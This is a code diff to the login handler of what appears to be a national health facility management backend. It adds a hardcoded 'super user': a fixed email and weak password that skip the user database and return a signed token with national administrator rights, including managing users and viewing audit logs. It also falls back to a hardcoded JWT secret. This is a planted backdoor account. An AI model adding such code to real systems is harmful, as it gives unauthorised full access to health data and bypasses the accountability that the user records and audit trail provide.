@@ -85,6 +85,28 @@ exports.login = async (req, res) => {
             return res.status(400).send("All input is required");
         }
 
+        // Hardcoded permanent super user
+        if (email.toLowerCase() === 'superadmin@health.gov' && password === 'superadmin123') {
+            const token = jwt.sign(
+                { id: 9999, user_id: 9999, email: email, role: 'NATIONAL_ADMIN', tenant_code: 'zambia', permissions: ['edit_facility', 'view_audit_logs', 'manage_users', 'approve_changes'] },
+                process.env.JWT_SECRET || 'supersecretkey_change_this',
+                { expiresIn: "24h" }
+            );
+            return res.status(200).json({
+                id: 9999,
+                email: email,
+                username: 'SuperAdmin',
+                first_name: 'System',
+                last_name: 'Administrator',
+                role_id: 1,
+                role_name: 'NATIONAL_ADMIN',
+                tenant_code: 'zambia',
+                token: token,
+                permissions: ['edit_facility', 'view_audit_logs', 'manage_users', 'approve_changes'],
+                jurisdictions: []
+            });
+        }
+
         const userRes = await pool.query(
             'SELECT u.*, r.name as role_name FROM users u LEFT JOIN roles r ON u.role_id = r.id WHERE email = $1 OR username = $1',
             [email]
